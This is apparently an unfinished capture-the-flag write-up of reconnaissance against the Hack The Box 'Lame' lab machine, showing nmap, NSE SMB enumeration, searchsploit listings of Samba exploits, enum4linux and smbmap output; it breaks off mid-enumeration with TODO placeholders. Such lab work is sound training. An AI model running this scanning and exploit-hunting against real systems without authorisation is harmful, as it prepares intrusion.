# Reconnaissance
In order to get a fast overview about open ports on the target machine, two nmap scans will be executed.


`nmap -sT -p- --min-rate 10000 -oA /home/bernhard/htb/lame/scans/nmap_tcp_ports 10.129.187.154`

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 06:34 CEST
Nmap scan report for 10.129.187.154
Host is up (0.053s latency).
Not shown: 65531 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 25.94 seconds

```


`nmap -sU -p- --min-rate 10000 -oA /home/bernhard/htb/lame/scans/nmap_udp_ports 10.129.187.154`

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 06:36 CEST
Nmap scan report for 10.129.187.154
Host is up (0.11s latency).
Not shown: 65531 open|filtered ports
PORT     STATE  SERVICE
22/udp   closed ssh
139/udp  closed netbios-ssn
445/udp  closed microsoft-ds
3632/udp closed distcc

Nmap done: 1 IP address (1 host up) scanned in 75.08 seconds
```

`nmap -sC -sV -p 21,22,139,445 -oA /home/bernhard/htb/lame/scans/nmap_tcp_scripts 10.129.187.154`

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 06:44 CEST
Nmap scan report for 10.129.187.154
Host is up (0.070s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.17.226
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h01m24s, deviation: 2h49m43s, median: 1m23s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-08-17T00:46:05-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.21 seconds

```

`nmap -sU -sC -sV -p 21,22,139,445 -oA /home/bernhard/htb/lame/scans/nmap_udp_scripts 10.129.187.154`


```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 06:45 CEST
Nmap scan report for 10.129.187.154
Host is up (0.046s latency).

PORT    STATE         SERVICE      VERSION
21/udp  open|filtered ftp
22/udp  closed        ssh
139/udp closed        netbios-ssn
445/udp closed        microsoft-ds

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.93 seconds

```

# Enumeration
## Port 139/tcp

`nmap -vv --reason -Pn -sV -p 139 --script='banner,(nbstat or smb* or samba* or ssl*) and not (brute or broadcast or dos or external or fuzzer)' --script-args='unsafe=1' -oA /home/bernhard/htb/lame/scans/tcp_139_nmap 10.129.187.154`

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 07:51 CEST
NSE: Loaded 85 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:51
Completed NSE at 07:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:51
Completed NSE at 07:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:51
Completed NSE at 07:51, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 07:51
Completed Parallel DNS resolution of 1 host. at 07:51, 0.02s elapsed
Initiating SYN Stealth Scan at 07:51
Scanning 10.129.187.154 [1 port]
Discovered open port 139/tcp on 10.129.187.154
Completed SYN Stealth Scan at 07:51, 0.07s elapsed (1 total ports)
Initiating Service scan at 07:51
Scanning 1 service on 10.129.187.154
Completed Service scan at 07:51, 11.28s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.187.154.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:51
NSE Timing: About 87.32% done; ETC: 07:52 (0:00:05 remaining)
NSE Timing: About 95.77% done; ETC: 07:52 (0:00:03 remaining)
NSE Timing: About 95.77% done; ETC: 07:53 (0:00:04 remaining)
NSE Timing: About 95.77% done; ETC: 07:53 (0:00:05 remaining)
NSE Timing: About 97.18% done; ETC: 07:54 (0:00:04 remaining)
NSE Timing: About 97.18% done; ETC: 07:54 (0:00:05 remaining)
NSE Timing: About 98.59% done; ETC: 07:55 (0:00:03 remaining)
NSE Timing: About 98.59% done; ETC: 07:55 (0:00:03 remaining)
NSE Timing: About 98.59% done; ETC: 07:56 (0:00:04 remaining)
NSE Timing: About 98.59% done; ETC: 07:56 (0:00:04 remaining)
NSE Timing: About 98.59% done; ETC: 07:57 (0:00:05 remaining)
NSE Timing: About 98.59% done; ETC: 07:57 (0:00:05 remaining)
Completed NSE at 07:58, 383.30s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:58
NSE Timing: About 92.31% done; ETC: 07:58 (0:00:03 remaining)
NSE Timing: About 92.31% done; ETC: 07:59 (0:00:05 remaining)
NSE Timing: About 92.31% done; ETC: 07:59 (0:00:08 remaining)
Completed NSE at 08:00, 115.58s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:00
Completed NSE at 08:00, 0.00s elapsed
Nmap scan report for 10.129.187.154
Host is up, received user-set (0.037s latency).
Scanned at 2021-08-17 07:51:38 CEST for 511s

PORT    STATE SERVICE     REASON         VERSION
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Host script results:
|_smb-enum-sessions: ERROR: Script execution failed (use -d to debug)
| smb-enum-shares: 
|   account_used: <blank>
|   \\10.129.187.154\ADMIN$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.129.187.154\IPC$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|   \\10.129.187.154\opt: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.129.187.154\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|   \\10.129.187.154\tmp: 
|     Type: STYPE_DISKTREE
|     Comment: oh noes!
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|_    Anonymous access: READ/WRITE
| smb-enum-users: 
|   LAME\backup (RID: 1068)
|     Full name:   backup
|     Flags:       Normal user account, Account disabled
|   LAME\bin (RID: 1004)
|     Full name:   bin
|     Flags:       Normal user account, Account disabled
|   LAME\bind (RID: 1210)
|     Flags:       Normal user account, Account disabled
|   LAME\daemon (RID: 1002)
|     Full name:   daemon
|     Flags:       Normal user account, Account disabled
|   LAME\dhcp (RID: 1202)
|     Flags:       Normal user account, Account disabled
|   LAME\distccd (RID: 1222)
|     Flags:       Normal user account, Account disabled
|   LAME\ftp (RID: 1214)
|     Flags:       Normal user account, Account disabled
|   LAME\games (RID: 1010)
|     Full name:   games
|     Flags:       Normal user account, Account disabled
|   LAME\gnats (RID: 1082)
|     Full name:   Gnats Bug-Reporting System (admin)
|     Flags:       Normal user account, Account disabled
|   LAME\irc (RID: 1078)
|     Full name:   ircd
|     Flags:       Normal user account, Account disabled
|   LAME\klog (RID: 1206)
|     Flags:       Normal user account, Account disabled
|   LAME\libuuid (RID: 1200)
|     Flags:       Normal user account, Account disabled
|   LAME\list (RID: 1076)
|     Full name:   Mailing List Manager
|     Flags:       Normal user account, Account disabled
|   LAME\lp (RID: 1014)
|     Full name:   lp
|     Flags:       Normal user account, Account disabled
|   LAME\mail (RID: 1016)
|     Full name:   mail
|     Flags:       Normal user account, Account disabled
|   LAME\man (RID: 1012)
|     Full name:   man
|     Flags:       Normal user account, Account disabled
|   LAME\msfadmin (RID: 3000)
|     Full name:   msfadmin,,,
|     Flags:       Normal user account
|   LAME\mysql (RID: 1218)
|     Full name:   MySQL Server,,,
|     Flags:       Normal user account, Account disabled
|   LAME\news (RID: 1018)
|     Full name:   news
|     Flags:       Normal user account, Account disabled
|   LAME\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Normal user account, Account disabled
|   LAME\postfix (RID: 1212)
|     Flags:       Normal user account, Account disabled
|   LAME\postgres (RID: 1216)
|     Full name:   PostgreSQL administrator,,,
|     Flags:       Normal user account, Account disabled
|   LAME\proftpd (RID: 1226)
|     Flags:       Normal user account, Account disabled
|   LAME\proxy (RID: 1026)
|     Full name:   proxy
|     Flags:       Normal user account, Account disabled
|   LAME\root (RID: 1000)
|     Full name:   root
|     Flags:       Normal user account, Account disabled
|   LAME\service (RID: 3004)
|     Full name:   ,,,
|     Flags:       Normal user account, Account disabled
|   LAME\sshd (RID: 1208)
|     Flags:       Normal user account, Account disabled
|   LAME\sync (RID: 1008)
|     Full name:   sync
|     Flags:       Normal user account, Account disabled
|   LAME\sys (RID: 1006)
|     Full name:   sys
|     Flags:       Normal user account, Account disabled
|   LAME\syslog (RID: 1204)
|     Flags:       Normal user account, Account disabled
|   LAME\telnetd (RID: 1224)
|     Flags:       Normal user account, Account disabled
|   LAME\tomcat55 (RID: 1220)
|     Flags:       Normal user account, Account disabled
|   LAME\user (RID: 3002)
|     Full name:   just a user,111,,
|     Flags:       Normal user account
|   LAME\uucp (RID: 1020)
|     Full name:   uucp
|     Flags:       Normal user account, Account disabled
|   LAME\www-data (RID: 1066)
|     Full name:   www-data
|_    Flags:       Normal user account, Account disabled
| smb-ls: Volume \\10.129.187.154\tmp
| SIZE   TIME                 FILENAME
| <DIR>  2021-08-17T05:56:32  .
| <DIR>  2020-10-31T06:33:58  ..
| 0      2021-08-16T13:07:46  5580.jsvc_up
| <DIR>  2021-08-16T13:06:29  vmware-root
| 1600   2021-08-16T13:06:29  vgauthsvclog.txt.0
|_
| smb-mbenum: 
|   Master Browser
|     LAME  0.0  lame server (Samba 3.0.20-Debian)
|   Print server
|     LAME  0.0  lame server (Samba 3.0.20-Debian)
|   Server
|     LAME  0.0  lame server (Samba 3.0.20-Debian)
|   Server service
|     LAME  0.0  lame server (Samba 3.0.20-Debian)
|   Unix server
|     LAME  0.0  lame server (Samba 3.0.20-Debian)
|   Windows NT/2000/XP/2003 server
|     LAME  0.0  lame server (Samba 3.0.20-Debian)
|   Workstation
|_    LAME  0.0  lame server (Samba 3.0.20-Debian)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-08-17T01:53:29-04:00
|_smb-print-text: false
| smb-protocols: 
|   dialects: 
|_    NT LM 0.12 (SMBv1) [dangerous, but default]
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-system-info: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-061: false
|_smb2-capabilities: Couldn't establish a SMBv2 connection.
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:00
Completed NSE at 08:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:00
Completed NSE at 08:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:00
Completed NSE at 08:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 511.04 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)

```

`nmap -vv --reason -Pn -sV -p 139 --script=samba-vuln-cve-2012-1182 -oA /home/bernhard/htb/lame/scans/tcp_139_nmap-cve-2012-1182 10.129.187.154`

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 08:14 CEST
NSE: Loaded 46 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 08:14
Completed Parallel DNS resolution of 1 host. at 08:14, 0.03s elapsed
Initiating SYN Stealth Scan at 08:14
Scanning 10.129.187.154 [1 port]
Discovered open port 139/tcp on 10.129.187.154
Completed SYN Stealth Scan at 08:14, 0.08s elapsed (1 total ports)
Initiating Service scan at 08:14
Scanning 1 service on 10.129.187.154
Completed Service scan at 08:14, 11.29s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.187.154.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 08:14
Completed NSE at 08:14, 3.09s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
Nmap scan report for 10.129.187.154
Host is up, received user-set (0.045s latency).
Scanned at 2021-08-17 08:14:35 CEST for 14s

PORT    STATE SERVICE     REASON         VERSION
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.24 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)

```

`searchsploit --colour "samba"`


```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                     |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GoSamba 1.0.1 - 'INCLUDE_PATH' Multiple Remote File Inclusions                                                                                                                                     | php/webapps/4575.txt
Inteno IOPSYS 3.16.4 - root filesystem access via sambashare (Authenticated)                                                                                                                       | hardware/webapps/49438.py
Microsoft Windows XP/2003 - Samba Share Resource Exhaustion (Denial of Service)                                                                                                                    | windows/dos/148.sh
Samba 1.9.19 - 'Password' Remote Buffer Overflow                                                                                                                                                   | linux/remote/20308.c
Samba 2.0.7 - SWAT Logfile Permissions                                                                                                                                                             | linux/local/20341.sh
Samba 2.0.7 - SWAT Logging Failure                                                                                                                                                                 | unix/remote/20340.c
Samba 2.0.7 - SWAT Symlink (1)                                                                                                                                                                     | linux/local/20338.c
Samba 2.0.7 - SWAT Symlink (2)                                                                                                                                                                     | linux/local/20339.sh
Samba 2.0.x - Insecure TMP File Symbolic Link                                                                                                                                                      | linux/local/20776.c
Samba 2.0.x/2.2 - Arbitrary File Creation                                                                                                                                                          | unix/remote/20968.txt
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                                                                                       | osx/remote/9924.rb
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                                                                                            | linux/remote/16321.rb
Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                  | bsd_x86/remote/16880.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                                                                                                    | linux/local/23674.txt
Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                | linux_x86/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                  | osx_ppc/remote/16876.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                            | solaris_sparc/remote/16330.rb
Samba 2.2.8 - Brute Force Method Remote Command Execution                                                                                                                                          | linux/remote/55.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                                                                                                         | unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                                                                                                         | unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                                                                                                         | unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                                                                                                         | unix/remote/22471.txt
Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                                                                                               | linux/remote/9936.rb
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                                                                                            | unix/remote/22356.c
Samba 2.2.x - Remote Buffer Overflow                                                                                                                                                               | linux/remote/7.pl
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                                               | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                                             | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                                   | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                                                                                                 | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                                             | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                                           | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                                                                                           | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                                                                                                  | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                                                                                                   | linux/remote/364.pl
Samba 3.3.12 (Linux x86) - 'chain_reply' Memory Corruption (Metasploit)                                                                                                                            | linux_x86/remote/16860.rb
Samba 3.3.5 - Format String / Security Bypass                                                                                                                                                      | linux/remote/33053.txt
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                                                                                                        | linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal                                                                                                                                                          | linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                                                                                                                                             | linux/remote/33598.rb
Samba 3.4.7/3.5.1 - Denial of Service                                                                                                                                                              | linux/dos/12588.txt
Samba 3.5.0 - Remote Code Execution                                                                                                                                                                | linux/remote/42060.py
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                                                                                                       | linux/remote/42084.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                                                                                                                                                         | linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                                                                                                                                         | linux/dos/27778.txt
Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory                                                                                                                           | multiple/remote/41740.txt
Samba < 2.0.5 - Local Overflow                                                                                                                                                                     | linux/local/19428.c
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                                                                                  | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                              | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                      | linux_x86/dos/36741.py
Sambar FTP Server 6.4 - 'SIZE' Remote Denial of Service                                                                                                                                            | windows/dos/2934.php
Sambar Server 4.1 Beta - Admin Access                                                                                                                                                              | cgi/remote/20570.txt
Sambar Server 4.2 Beta 7 - Batch CGI                                                                                                                                                               | windows/remote/19761.txt
Sambar Server 4.3/4.4 Beta 3 - Search CGI                                                                                                                                                          | windows/remote/20223.txt
Sambar Server 4.4/5.0 - 'pagecount' File Overwrite                                                                                                                                                 | multiple/remote/21026.txt
Sambar Server 4.x/5.0 - Insecure Default Password Protection                                                                                                                                       | multiple/remote/21027.txt
Sambar Server 5.1 - Sample Script Denial of Service                                                                                                                                                | windows/dos/21228.c
Sambar Server 5.1 - Script Source Disclosure                                                                                                                                                       | cgi/remote/21390.txt
Sambar Server 5.x - 'results.stm' Cross-Site Scripting                                                                                                                                             | windows/remote/22185.txt
Sambar Server 5.x - Information Disclosure                                                                                                                                                         | windows/remote/22434.txt
Sambar Server 5.x - Open Proxy / Authentication Bypass                                                                                                                                             | windows/remote/24076.txt
Sambar Server 5.x/6.0/6.1 - 'results.stm' indexname Cross-Site Scripting                                                                                                                           | windows/remote/25694.txt
Sambar Server 5.x/6.0/6.1 - logout RCredirect Cross-Site Scripting                                                                                                                                 | windows/remote/25695.txt
Sambar Server 5.x/6.0/6.1 - Server Referer Cross-Site Scripting                                                                                                                                    | windows/remote/25696.txt
Sambar Server 6 - Search Results Buffer Overflow (Metasploit)                                                                                                                                      | windows/remote/16756.rb
Sambar Server 6.0 - 'results.stm' POST Buffer Overflow                                                                                                                                             | windows/dos/23664.py
Sambar Server 6.1 Beta 2 - 'show.asp?show' Cross-Site Scripting                                                                                                                                    | windows/remote/24161.txt
Sambar Server 6.1 Beta 2 - 'showini.asp' Arbitrary File Access                                                                                                                                     | windows/remote/24163.txt
Sambar Server 6.1 Beta 2 - 'showperf.asp?title' Cross-Site Scripting                                                                                                                               | windows/remote/24162.txt
SWAT Samba Web Administration Tool - Cross-Site Request Forgery                                                                                                                                    | cgi/webapps/17577.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

TODO: description before command execution

`searchsploit --colour "samba 3."`

TODO: command description

```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                     |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Inteno IOPSYS 3.16.4 - root filesystem access via sambashare (Authenticated)                                                                                                                       | hardware/webapps/49438.py
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                                               | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                                             | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                                   | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                                                                                                 | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                                             | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                                                           | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                                                                                           | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                                                                                                  | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                                                                                                   | linux/remote/364.pl
Samba 3.3.12 (Linux x86) - 'chain_reply' Memory Corruption (Metasploit)                                                                                                                            | linux_x86/remote/16860.rb
Samba 3.3.5 - Format String / Security Bypass                                                                                                                                                      | linux/remote/33053.txt
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                                                                                                        | linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal                                                                                                                                                          | linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                                                                                                                                             | linux/remote/33598.rb
Samba 3.4.7/3.5.1 - Denial of Service                                                                                                                                                              | linux/dos/12588.txt
Samba 3.5.0 - Remote Code Execution                                                                                                                                                                | linux/remote/42060.py
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                                                                                                       | linux/remote/42084.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                                                                                                                                                         | linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                                                                                                                                         | linux/dos/27778.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                              | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                              | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                      | linux_x86/dos/36741.py
Sambar Server 4.3/4.4 Beta 3 - Search CGI                                                                                                                                                          | windows/remote/20223.txt
Sambar Server 6.1 Beta 2 - 'showini.asp' Arbitrary File Access                                                                                                                                     | windows/remote/24163.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

TODO: description before command execution

`searchsploit --colour "samba 4."`

TODO: command description

```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                     |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                                                                                       | osx/remote/9924.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                                                                                                    | linux/local/23674.txt
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                                                                                                   | linux/remote/364.pl
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                                                                                                        | linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal                                                                                                                                                          | linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                                                                                                                                             | linux/remote/33598.rb
Samba 3.4.7/3.5.1 - Denial of Service                                                                                                                                                              | linux/dos/12588.txt
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                                                                                                       | linux/remote/42084.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                                                                                                                                                         | linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                                                                                                                                         | linux/dos/27778.txt
Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory                                                                                                                           | multiple/remote/41740.txt
Sambar FTP Server 6.4 - 'SIZE' Remote Denial of Service                                                                                                                                            | windows/dos/2934.php
Sambar Server 4.1 Beta - Admin Access                                                                                                                                                              | cgi/remote/20570.txt
Sambar Server 4.2 Beta 7 - Batch CGI                                                                                                                                                               | windows/remote/19761.txt
Sambar Server 4.3/4.4 Beta 3 - Search CGI                                                                                                                                                          | windows/remote/20223.txt
Sambar Server 4.4/5.0 - 'pagecount' File Overwrite                                                                                                                                                 | multiple/remote/21026.txt
Sambar Server 4.x/5.0 - Insecure Default Password Protection                                                                                                                                       | multiple/remote/21027.txt
Sambar Server 5.x - Information Disclosure                                                                                                                                                         | windows/remote/22434.txt
Sambar Server 5.x/6.0/6.1 - 'results.stm' indexname Cross-Site Scripting                                                                                                                           | windows/remote/25694.txt
Sambar Server 6.0 - 'results.stm' POST Buffer Overflow                                                                                                                                             | windows/dos/23664.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```


`enum4linux -a -M -l -d 10.129.187.154 2>&1`

```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Aug 17 07:23:58 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.129.187.154
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 10.129.187.154    |
 ====================================================== 
[E] Can't find workgroup/domain


 ============================================== 
|    Nbtstat Information for 10.129.187.154    |
 ============================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
Looking up status of 10.129.187.154
No reply from 10.129.187.154

 ======================================= 
|    Session Check on 10.129.187.154    |
 ======================================= 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.

```

`nbtscan -rvh 10.129.187.154 2>&1`

```
Doing NBT name scan for addresses from 10.129.187.154


```

`smbclient -L\ -N -I 10.129.187.154 2>&1`

```
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED

```

`smbmap -H 10.129.187.154 -P 139 2>&1 | tee -a /home/bernhard/htb/lame/scans/tcp_139_smb-smbmap-share-permissions.txt; smbmap -u null -p "" -H 10.129.187.154 -P 139 2>&1`

```
[\] Working on it...
